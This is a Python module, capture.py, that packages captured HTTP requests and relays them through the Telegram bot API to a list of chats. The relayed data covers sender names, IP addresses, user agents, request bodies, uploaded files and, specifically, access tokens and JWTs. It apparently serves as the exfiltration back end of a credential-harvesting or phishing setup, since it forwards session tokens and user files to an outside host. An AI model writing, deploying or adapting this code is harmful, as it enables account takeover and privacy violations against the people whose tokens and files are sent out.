# capture.py
import json
import urllib.request
import uuid
from datetime import datetime, timezone


def _h(s):
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _multipart(fields: dict, files: list):
    boundary = "----capture" + uuid.uuid4().hex
    out = []
    for k, v in fields.items():
        out.append(f"--{boundary}\r\n".encode())
        out.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        out.append(str(v).encode("utf-8"))
        out.append(b"\r\n")
    for f in files:
        out.append(f"--{boundary}\r\n".encode())
        out.append(
            f'Content-Disposition: form-data; name="{f["name"]}"; filename="{f["filename"]}"\r\n'.encode()
        )
        out.append(f'Content-Type: {f.get("content_type", "application/octet-stream")}\r\n\r\n'.encode())
        out.append(f["data"])
        out.append(b"\r\n")
    out.append(f"--{boundary}--\r\n".encode())
    return b"".join(out), f"multipart/form-data; boundary={boundary}"


class TelegramCapture:
    API = "https://api.telegram.org/bot{token}/{method}"

    def __init__(self, bot_token, chat_ids):
        self.token = bot_token or ""
        if isinstance(chat_ids, (str, int)):
            chat_ids = [chat_ids]
        self.chats = [str(c) for c in (chat_ids or [])]

    def send(self, record: dict):
        if not self.token or not self.chats:
            return
        self._send_sync(record)

    def _send_sync(self, record):
        # user uploaded files
        user_files = record.pop("_files", []) or []

        # formatted text
        text = self._format(record)

        # json snapshot
        json_bytes = json.dumps(record, ensure_ascii=False, indent=2).encode("utf-8")
        ts_tag = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        src = record.get("source") or "capture"
        json_filename = f"{src}_{ts_tag}.json"

        for chat_id in self.chats:
            try:
                # 1. text message
                if text.strip():
                    self._message(chat_id, text)

                # 2. json snapshot file (always)
                self._document(
                    chat_id,
                    filename=json_filename,
                    data=json_bytes,
                    caption=f"📄 {json_filename}",
                    content_type="application/json",
                )

                # 3. user's uploaded files
                for f in user_files:
                    self._document(
                        chat_id,
                        filename=f["filename"],
                        data=f["data"],
                        caption=f'📎 {f["filename"]} — {len(f["data"])} bytes',
                        content_type=f.get("content_type", "application/octet-stream"),
                    )
            except Exception as e:
                print(f"[capture:telegram:{chat_id}] {e}")

    # ---------------- formatting ----------------

    def _format(self, r):
        src = r.get("source") or "?"
        icon = {
            "generated":        "✅",
            "generated_failed": "❌",
            "request":          "📥",
        }.get(src, "📌")

        L = [f"{icon} <b>{_h(src.upper())}</b>"]

        ident = []
        if r.get("sender"):
            ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
        if r.get("ip"):
            ident.append(f"🌐 <code>{_h(r.get('ip'))}</code>")
        if ident:
            L.append(" • ".join(ident))

        L.append(f"🕒 <code>{_h(r.get('ts'))}</code>")

        if r.get("level") or r.get("region"):
            L.append("")
            L.append(f"🎮 <b>Level:</b> <code>{_h(r.get('level'))}</code>")
            L.append(f"🌍 <b>Region:</b> <code>{_h(r.get('region'))}</code>")

        L.append("")
        L.append("━━━━━━━━━━━━━━━━━━━━")
        L.append(f"<b>{_h(r.get('method'))}</b>  <code>{_h(r.get('path'))}</code>")
        L.append("━━━━━━━━━━━━━━━━━━━━")

        if r.get("user_agent"):
            L.append(f"🧭 <i>{_h(r.get('user_agent'))[:180]}</i>")
        if r.get("referer"):
            L.append(f"🔗 <i>{_h(r.get('referer'))[:150]}</i>")

        q = r.get("query")
        if q and q not in ("{}", "null", "None"):
            L.append("")
            L.append("🔎 <b>Query</b>")
            L.append(f"<pre>{_h(q)[:600]}</pre>")

        b = r.get("body")
        if b:
            L.append("")
            L.append("📨 <b>Body</b>")
            L.append(f"<pre>{_h(b)[:600]}</pre>")

        if r.get("files_summary"):
            L.append("")
            L.append("📎 <b>Files</b>")
            L.append(f"<pre>{_h(r.get('files_summary'))[:600]}</pre>")

        if r.get("access_token"):
            L.append("")
            L.append("🎟 <b>AccessToken</b>")
            L.append(f"<pre>{_h(r.get('access_token'))[:800]}</pre>")

        if r.get("jwt_token"):
            L.append("")
            L.append("💎 <b>JWT</b>")
            L.append(f"<pre>{_h(r.get('jwt_token'))[:1200]}</pre>")

        if r.get("error"):
            L.append("")
            L.append("⚠️ <b>Error</b>")
            L.append(f"<pre>{_h(r.get('error'))[:400]}</pre>")

        return "\n".join(L)

    # ---------------- api ----------------

    def _api(self, m):
        return self.API.format(token=self.token, method=m)

    def _message(self, chat_id, text):
        chunks, buf, limit = [], "", 4000
        for line in text.split("\n"):
            if len(buf) + len(line) + 1 > limit:
                chunks.append(buf); buf = line
            else:
                buf = (buf + "\n" + line) if buf else line
        if buf: chunks.append(buf)
        for chunk in chunks:
            data = json.dumps({
                "chat_id": chat_id, "text": chunk,
                "parse_mode": "HTML", "disable_web_page_preview": True,
            }).encode()
            req = urllib.request.Request(self._api("sendMessage"), data=data,
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10).read()

    def _document(self, chat_id, filename, data, caption, content_type):
        body, ctype = _multipart(
            fields={"chat_id": chat_id, "caption": caption[:900]},
            files=[{
                "name": "document",
                "filename": filename,
                "data": data,
                "content_type": content_type,
            }],
        )
        req = urllib.request.Request(self._api("sendDocument"), data=body,
            headers={"Content-Type": ctype}, method="POST")
        urllib.request.urlopen(req, timeout=60).read()
